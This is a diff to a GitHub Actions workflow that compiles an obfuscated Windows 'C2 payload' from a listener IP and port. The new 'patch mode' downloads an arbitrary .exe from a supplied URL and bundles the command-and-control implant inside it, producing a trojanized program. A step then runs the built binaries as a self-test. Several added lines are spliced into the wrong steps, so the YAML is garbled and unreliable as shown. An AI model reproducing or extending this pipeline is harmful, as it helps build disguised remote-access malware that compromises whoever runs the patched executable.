@@ -13,6 +13,10 @@ on:
         description: 'IP Listener'
         required: false
         default: '0.0.0.0'
+      patch_url:
+        description: 'URL fichier .exe à patcher (optionnel)'
+        required: false
+        default: ''
       listener_port:
         description: 'Port Listener'
         required: false
@@ -26,16 +30,56 @@ jobs:
     - uses: actions/checkout@v3
     
     - name: Set up Python 3.11
+          if ($config.PSObject.Properties.Name -contains 'patch_url') {
+            echo "patch_url=$($config.patch_url)" >> $env:GITHUB_OUTPUT
+          } else {
+            echo "patch_url=" >> $env:GITHUB_OUTPUT
+          }
       uses: actions/setup-python@v4
       with:
         python-version: '3.11'
     
+          if ($config.PSObject.Properties.Name -contains 'patch_url') {
+            Write-Host "  Patch URL: $($config.patch_url)"
+          }
     - name: Install dependencies
       run: |
         python -m pip install --upgrade pip
         pip install pyinstaller
+          echo "patch_url=${{ github.event.inputs.patch_url || '' }}" >> $env:GITHUB_OUTPUT
     
     - name: Read build configuration
+    
+    - name: Prepare patch file (optional)
+      if: ${{ steps.config.outputs.patch_url != '' }}
+      shell: pwsh
+      run: |
+        $url = "${{ steps.config.outputs.patch_url }}"
+        try {
+          $u = [System.Uri]$url
+          $fileName = [System.IO.Path]::GetFileName($u.AbsolutePath)
+          if ([string]::IsNullOrWhiteSpace($fileName)) { $fileName = "patch_target.exe" }
+        } catch { $fileName = "patch_target.exe" }
+        Write-Host "Downloading patch file: $url"
+        Invoke-WebRequest -Uri $url -OutFile $fileName
+        if (-not (Test-Path $fileName)) {
+          Write-Host "❌ Failed to download patch file"; exit 1
+        }
+        Write-Host "Downloaded to: $fileName"
+    
+    - name: Build C2 Binary
+      shell: pwsh
+      run: |
+        $ip = "${{ steps.config.outputs.listener_ip }}"
+        $port = [int]"${{ steps.config.outputs.listener_port }}"
+        $obf = [int]"${{ steps.config.outputs.obfuscation_level }}"
+        $patch = Get-ChildItem -File -Name | Where-Object { $_.ToLower().EndsWith('.exe') -and $_ -ne 'c2_payload.exe' } | Select-Object -First 1
+        if ($patch) {
+          Write-Host "Building in PATCH mode with: $patch"
+          python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('$ip', $port, $obf, 'windows', '$patch')"
+        } else {
+          python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('$ip', $port, $obf, 'windows')"
+        }
       id: config
       run: |
         if (Test-Path build_config.json) {
@@ -89,3 +133,30 @@ jobs:
         name: c2-payload-windows
         path: dist/c2_payload.exe
         retention-days: 30
+
+    - name: Smoke test executables (SELFTEST)
+      if: ${{ always() }}
+      shell: pwsh
+      run: |
+        Write-Host "Running smoke tests on built executables with SELFTEST=1..."
+        $ErrorActionPreference = 'Stop'
+        $exes = Get-ChildItem -Path dist -Filter *.exe -File -ErrorAction SilentlyContinue
+        if (-not $exes) {
+          Write-Host "No .exe files found in dist/. Skipping self-test."
+          exit 0
+        }
+        $fail = 0
+        foreach ($exe in $exes) {
+          Write-Host "Testing: $($exe.FullName)"
+          $env:SELFTEST = '1'
+          & $exe.FullName
+          $code = $LASTEXITCODE
+          Write-Host "Exit code: $code"
+          if ($code -ne 0) { $fail = 1 }
+        }
+        if ($fail -ne 0) {
+          Write-Host "❌ One or more executables failed self-test"
+          exit 1
+        } else {
+          Write-Host "✅ All executables passed self-test"
+        }
